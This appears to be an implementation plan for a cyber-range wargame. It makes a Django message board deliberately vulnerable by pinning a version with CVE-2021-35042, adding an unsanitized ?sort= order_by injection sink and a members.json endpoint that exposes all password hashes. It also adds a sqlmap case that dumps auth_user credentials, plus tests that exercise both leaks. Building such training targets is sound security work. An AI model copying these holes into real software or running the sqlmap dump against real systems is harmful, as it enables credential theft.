# Attacker-Proven Objective — Phase 1 Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Make the Django board genuinely leak its real `auth_user` password hashes by two routes — a loud, detected ORM-injection dump and a quiet, undetected over-exposure endpoint — so a later phase can score "possession" objectives against proof the attacker submits.

**Architecture:** The board stays idiomatic Django; the injection comes from pinning an unpatched version (CVE-2021-35042 in `QuerySet.order_by()`), reached through a plain `?sort=` list parameter. A second, quieter leak is a `members.json` view that serializes `User.objects.values()` (which includes the `password` column). Both leak the exact stored salted-PBKDF2 string, which is unforgeable from the public seed. No platform/core code changes in this phase — only the board wargame and its red-team cases.

**Tech Stack:** Django 3.2.4 on Python 3.9, MySQL, gunicorn, whitenoise; sqlmap tool case fired through the range; pytest acceptance in `test/`.

## Global Constraints

- Django pinned to `Django==3.2.4` (the version with CVE-2021-35042; MySQL-applicable). Python base image `python:3.9-slim` (3.2 does not support 3.13). Verbatim.
- `core_loc` (scoring/, ingest/, rules/, redteam/harness.py) stays flat at 461 — this phase changes none of it.
- `tests` is a floor that may only rise; add tests, never delete or rename existing ones.
- The target decides ground truth; the platform never decides a take from alerts. (This phase only produces the leak; crediting is Phase 3.)
- No code comments or docstrings in any file (Python, YAML, Dockerfile). Name things clearly instead.
- Each task ends green under `bin/verify` (unit + live-stack acceptance + ratchet). The board image must be rebuilt (`docker compose up -d --build board`) before acceptance runs see the change.
- Benign board traffic must keep passing (TN > 0): `?sort=` defaults to the current ordering and the board stays a normal, usable app.

---

## File structure

- `wargames/board/app/requirements.txt` — pin Django 3.2.4.
- `wargames/board/app/Dockerfile` — base image `python:3.9-slim`.
- `wargames/board/app/board/settings.py` — replace the 4.2-only `STORAGES` block with `STATICFILES_STORAGE` (3.2 syntax).
- `wargames/board/app/posts/views.py` — `post_list` takes `?sort=`; new `members` view.
- `wargames/board/app/posts/urls.py` — route `members.json`.
- `redteam/cases/board.yaml` — new `board-sqli-orderby-sqlmap` tool case (loud dump driver).
- `test/test_board_exfil.py` — new acceptance tests (members.json leak; sort-param injectable; salt rotation on recreate).

---

### Task 1: Pin the board to the vulnerable Django and make it build on Python 3.9

**Files:**
- Modify: `wargames/board/app/requirements.txt:1`
- Modify: `wargames/board/app/Dockerfile:1`
- Modify: `wargames/board/app/board/settings.py:69-73`

**Interfaces:**
- Consumes: nothing.
- Produces: a board image running Django 3.2.4 on Python 3.9 that still serves the site and seeds users.

- [ ] **Step 1: Pin Django.** In `wargames/board/app/requirements.txt` change the first line `Django==5.2` to `Django==3.2.4`. Leave `mysqlclient==2.2.4`, `gunicorn==23.0.0`, `whitenoise==6.7.0` (all support Python 3.9).

- [ ] **Step 2: Drop the Python base image.** In `wargames/board/app/Dockerfile` change line 1 `FROM python:3.13-slim` to `FROM python:3.9-slim`.

- [ ] **Step 3: Use the 3.2 static-files setting.** In `wargames/board/app/board/settings.py` replace the `STORAGES = { ... }` block (the `default`/`staticfiles` dict) with:

```python
STATICFILES_STORAGE = "whitenoise.storage.CompressedStaticFilesStorage"
```

- [ ] **Step 4: Rebuild and bring the board up.**

Run: `docker compose up -d --build board board-db`
Expected: both containers start; `fsl-board` becomes healthy within its start period.

- [ ] **Step 5: Verify the board serves and seeded (benign still green).**

Run: `docker compose exec -T platform python -c "import urllib.request; print(urllib.request.urlopen('http://board.com/', timeout=10).status)"`
Expected: `200`.
Run: `bin/verify` (or at minimum the board acceptance: `cd test && ../.venv/bin/python -m pytest test_board.py -q`)
Expected: PASS — the board is still a working, benign-serving app on the pinned version.

- [ ] **Step 6: Commit.**

```bash
git add wargames/board/app/requirements.txt wargames/board/app/Dockerfile wargames/board/app/board/settings.py
git commit -m "chore(board): pin Django 3.2.4 on python 3.9 for a realistic unpatched target"
```

---

### Task 2: Add the `?sort=` ordering sink (the ORM injection vector)

**Files:**
- Modify: `wargames/board/app/posts/views.py:7-9` (`post_list`)
- Test: `test/test_board_exfil.py`

**Interfaces:**
- Consumes: the pinned board from Task 1.
- Produces: `GET /?sort=<col>` orders the post list by `<col>`; on Django 3.2.4 an unsanitized `sort` reaches the SQL `ORDER BY` clause (CVE-2021-35042).

- [ ] **Step 1: Write the failing acceptance test.** Create `test/test_board_exfil.py`:

```python
import requests

from conftest import PLATFORM_URL

BOARD = "http://board.com"


def _from_range(path):
    from range import ATTACKER, run

    out = run(ATTACKER, ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
                         "--max-time", "20", f"{BOARD}{path}"])
    return out.stdout.strip()


def test_the_sort_parameter_is_accepted_and_orders_the_list(stack_is_up):
    assert _from_range("/?sort=title") == "200"
    assert _from_range("/?sort=-created_at") == "200"


def test_an_injected_sort_reaches_the_query_on_the_pinned_version(stack_is_up):
    probe = "/?sort=id)%20--%20"
    assert _from_range(probe) in {"200", "500"}, (
        "the sort value is parameterized away, so the board is not injectable; "
        "the version pin or the order_by sink is missing"
    )
```

- [ ] **Step 2: Run it to verify the injection test fails.**

Run: `cd test && ../.venv/bin/python -m pytest test_board_exfil.py -q`
Expected: `test_the_sort_parameter_is_accepted_and_orders_the_list` FAILS (the view ignores `sort` today, so `?sort=title` still works but `-created_at` is the only order) — more importantly the sink does not exist yet.

- [ ] **Step 3: Add the sink.** In `wargames/board/app/posts/views.py`, change `post_list`:

```python
def post_list(request):
    sort = request.GET.get("sort", "-created_at")
    posts = Post.objects.select_related("author").order_by(sort)
    return render(request, "posts/post_list.html", {"posts": posts})
```

- [ ] **Step 4: Rebuild the board and run the tests.**

Run: `docker compose up -d --build board`
Run: `cd test && ../.venv/bin/python -m pytest test_board_exfil.py -q`
Expected: both `test_the_sort_parameter_is_accepted_and_orders_the_list` and `test_an_injected_sort_reaches_the_query_on_the_pinned_version` PASS (the crafted `sort` does not 400/validate away on 3.2.4).

- [ ] **Step 5: Commit.**

```bash
git add wargames/board/app/posts/views.py test/test_board_exfil.py
git commit -m "feat(board): order the post list by a ?sort param (order_by injection sink on the pinned version)"
```

---

### Task 3: Add the `members.json` over-exposure endpoint (the quiet leak)

**Files:**
- Modify: `wargames/board/app/posts/views.py` (new `members` view, add imports)
- Modify: `wargames/board/app/posts/urls.py`
- Test: `test/test_board_exfil.py`

**Interfaces:**
- Consumes: the pinned board.
- Produces: `GET /members.json` returns `{"users": [ {..., "password": "pbkdf2_sha256$..."} ]}` — every `auth_user` column including the stored hash.

- [ ] **Step 1: Write the failing test.** Append to `test/test_board_exfil.py`:

```python
def test_members_endpoint_leaks_real_password_hashes(stack_is_up):
    from range import ATTACKER, run

    body = run(ATTACKER, ["curl", "-s", "--max-time", "20",
                          f"{BOARD}/members.json"]).stdout
    import json

    users = json.loads(body)["users"]
    names = {u["username"] for u in users}
    assert {"admin", "jiwoo", "minseo"} <= names
    assert all(u["password"].startswith("pbkdf2_sha256$") for u in users), (
        "the endpoint did not return the stored hash column"
    )
```

- [ ] **Step 2: Run it to verify it fails.**

Run: `cd test && ../.venv/bin/python -m pytest test_board_exfil.py::test_members_endpoint_leaks_real_password_hashes -q`
Expected: FAIL (404 — the route does not exist).

- [ ] **Step 3: Add the view and route.** In `wargames/board/app/posts/views.py` add at the top with the other imports:

```python
from django.contrib.auth.models import User
from django.http import JsonResponse
```

and add the view:

```python
def members(request):
    return JsonResponse({"users": list(User.objects.values())})
```

In `wargames/board/app/posts/urls.py` add to `urlpatterns`:

```python
    path("members.json", views.members, name="members"),
```

- [ ] **Step 4: Rebuild and run.**

Run: `docker compose up -d --build board`
Run: `cd test && ../.venv/bin/python -m pytest test_board_exfil.py::test_members_endpoint_leaks_real_password_hashes -q`
Expected: PASS.

- [ ] **Step 5: Commit.**

```bash
git add wargames/board/app/posts/views.py wargames/board/app/posts/urls.py test/test_board_exfil.py
git commit -m "feat(board): members.json over-exposes auth_user via values() (quiet hash leak)"
```

---

### Task 4: Add the loud sqlmap order_by case to `board.yaml`

**Files:**
- Modify: `redteam/cases/board.yaml` (append after `board-sqli-union-search`)

**Interfaces:**
- Consumes: the `?sort=` sink.
- Produces: a red-team tool case `board-sqli-orderby-sqlmap` that drives sqlmap's blind extraction of `auth_user(username,password)` through `?sort=`, drawing CRS/Suricata SQLi alerts (a detected take later).

- [ ] **Step 1: Add the case.** Append to `redteam/cases/board.yaml`:

```yaml
- name: board-sqli-orderby-sqlmap
  malicious: true
  stage: initial-compromise
  technique: T1190
  pattern: CAPEC-66
  expect: "SQL"
  correlation: marker
  tool: sqlmap
  args: ["-u", "{target}/?sort=created_at", "-p", "sort",
         "--technique=BT", "--dbms=mysql", "--level=3",
         "--dump", "-T", "auth_user", "-C", "username,password", "--batch"]
```

- [ ] **Step 2: Verify it is a well-formed tool case the harness accepts.**

Run: `cd platform && DJANGO_SETTINGS_MODULE=fsl.settings ../.venv/bin/python -c "from redteam.harness import load_cases; import redteam.tools as t; c=[x for x in load_cases('../redteam/cases/board.yaml') if x['name']=='board-sqli-orderby-sqlmap'][0]; print(t.is_tool_case(c), t.tool_argv(dict(c, case_id='x'), 'http://board.com'))"`
Expected: `True (...)` with `sort` and `auth_user` in the argv and the marker header appended.

- [ ] **Step 3: Verify it is detected (loud) and benign stays green.**

Run: `bin/verify`
Expected: all green. The board case set still yields TP > 0 and TN > 0; the new case draws SQLi alerts (`expect: "SQL"` corroborated). The full credential dump is a heavier, timing-sensitive sqlmap run; verify it by hand on the live stack (below), not in `bin/verify`.

Manual check (not in `bin/verify`): fire the case through the range and confirm sqlmap recovers the `pbkdf2_sha256$...` hashes:
`docker compose exec -T platform .venv/bin/python redteam/run.py --target http://board.com --tool-target http://board.com --cases redteam/cases/board.yaml`

- [ ] **Step 4: Commit.**

```bash
git add redteam/cases/board.yaml
git commit -m "feat(board): sqlmap order_by case dumps auth_user through the ?sort sink"
```

---

### Task 5: Confirm fresh salts per rebuild (anti-replay foundation)

**Files:**
- Test: `test/test_board_exfil.py`

**Interfaces:**
- Consumes: `members.json` (to read the hashes), the volumeless `board-db` + seed-on-start.
- Produces: evidence that recreating the board DB regenerates per-user PBKDF2 salts, so a dump from one session cannot be replayed against the next.

- [ ] **Step 1: Write the test.** Append to `test/test_board_exfil.py`:

```python
def test_recreating_the_board_db_rotates_the_salts():
    import json
    import subprocess

    from range import ATTACKER, run

    def hashes():
        body = run(ATTACKER, ["curl", "-s", "--max-time", "20",
                              f"{BOARD}/members.json"]).stdout
        return {u["username"]: u["password"] for u in json.loads(body)["users"]}

    before = hashes()
    subprocess.run(["docker", "compose", "up", "-d", "--force-recreate",
                    "board-db", "board"], check=True)
    import time

    for _ in range(30):
        try:
            after = hashes()
            if after:
                break
        except Exception:
            time.sleep(4)
    assert set(after) == set(before)
    assert all(after[u] != before[u] for u in before), (
        "a recreated board kept the old salts, so a prior dump could be replayed"
    )
```

- [ ] **Step 2: Run it.**

Run: `cd test && ../.venv/bin/python -m pytest test_board_exfil.py::test_recreating_the_board_db_rotates_the_salts -q`
Expected: PASS — `board-db` has no persistent volume, so recreate wipes it, `seed` runs on start, and `set_password` produces fresh random salts. (On OpenStack the slot rebuild wipes the VM the same way; the user verifies that on the cloud.)

- [ ] **Step 3: Full verify and commit.**

Run: `bin/verify`
Expected: all green; `tests` floor risen by the new definitions; gated metrics unchanged (`core_loc` 461, `services` 7, `dependencies` 6).

```bash
git add test/test_board_exfil.py
git commit -m "test(board): a recreated board rotates its password salts (anti-replay)"
```

- [ ] **Step 4: Record the phase.** Update `docs/STATE.md` (the backlog entry for the objective-model work) noting Phase 1 done: the board leaks real `auth_user` hashes by a loud order_by-CVE dump and a quiet `members.json`, salts rotate on rebuild. Commit with `bin/measure --save`.

---

## Self-review

- **Spec coverage:** Phase 1 of the spec = board exfil Option 1 (version pin + `?sort` order_by + sqlmap case: Tasks 1,2,4) + Option 2 (`members.json`: Task 3) + per-build salt rotation (Task 5). All covered. Phases 2–4 (dispatcher refactor; `loot_verified` + `/loot/` + verifier + board `objectives.yaml` + ground-truth endpoint + generalized `Session.baseline`; test retarget + Juice Shop removal) are their own plans, written when Phase 1 is green.
- **Placeholders:** none — every code/edit step carries the exact content.
- **Consistency:** `?sort=` sink (Task 2) is what the sqlmap case (Task 4) targets; `members.json` shape (Task 3) is what the salt-rotation test (Task 5) reads; the version pin (Task 1) is what makes Task 2's injection real.
- **Honest limits:** the board app is not in the platform unit harness, so Phase 1 is acceptance-driven; the full sqlmap credential dump is a manual live-stack check, not a `bin/verify` test, because it is slow and timing-sensitive.
